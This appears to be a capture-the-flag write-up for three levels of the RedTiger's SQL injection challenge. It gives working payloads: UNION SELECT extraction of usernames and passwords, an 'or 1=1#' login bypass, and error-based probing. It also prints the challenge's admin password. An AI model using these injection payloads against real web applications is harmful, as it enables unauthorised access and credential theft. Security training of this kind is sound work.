# RedTiger's SQL Injection Challenge Solutions

## Level 1: Simple SQL-Injection

### Vulnerability
- Parameter `cat` in the URL.

### Steps
1. **Initial Test:**
   - Setting the `cat` parameter to `2` resulted in an error, indicating the existence of only one category.
   
2. **Finding Number of Columns:**
   - Tested with `cat=1 order by 1,2,3,4,5` which showed an error.
   - Using `cat=1 order by 1,2,3,4` worked, indicating the table has four columns.
   
3. **Finding Displayable Columns:**
   - `cat=1 union select 1,2,3,4 from level1_users` to check which columns are visible.
   - Columns 3 and 4 are displayed.

4. **Extracting Data:**
   - Using `cat=1 union select 1,2, username, password from level1_users` to display the username and password.

## Level 2: Simple Login Bypass

### Vulnerability
- Authentication Bypass.

### Steps
1. **Initial Test:**
   - Inputting `gg'` in the password field triggered an error.
   
2. **Bypassing Authentication:**
   - Using `gg' or 1=1#` as the password.
   - The resulting SQL query: `SELECT * FROM users WHERE username = 'username' AND password = 'gg' or 1=1#'`.
   - The `1=1` condition always evaluates to true, allowing bypass.

## Level 3: Get an Error

### Vulnerability
- Lack of input validation and error handling leading to error-based SQL injection.

### Steps
1. **Initial Test:**
   - Changing the parameter from `?usr` to `?usr[]` caused an error.

2. **Analyzing Error:**
   - The error pointed to the `urlcrypt.inc` file.
   - The functions `encrypt()` and `decrypt()` in `urlcrypt.inc` handle encoding/decoding of queries.

3. **Determining Columns:**
   - Tested different numbers of columns to identify the total number.
   - More than 7 columns resulted in an error.

4. **Encrypting Query:**
   - Using the encryption function to encode the query.
   - Parameters that displayed information: columns 2, 6, 7, 5, and 4.
   - Chose columns 2 and 6 to display information.

5. **Result:**
   - Username: `Admin`
   - Password: `thisisaverysecurepasswordEEE5rt`

## Conclusion
The challenges demonstrate different types of SQL injections and emphasize the importance of proper input validation and error handling to secure web applications.
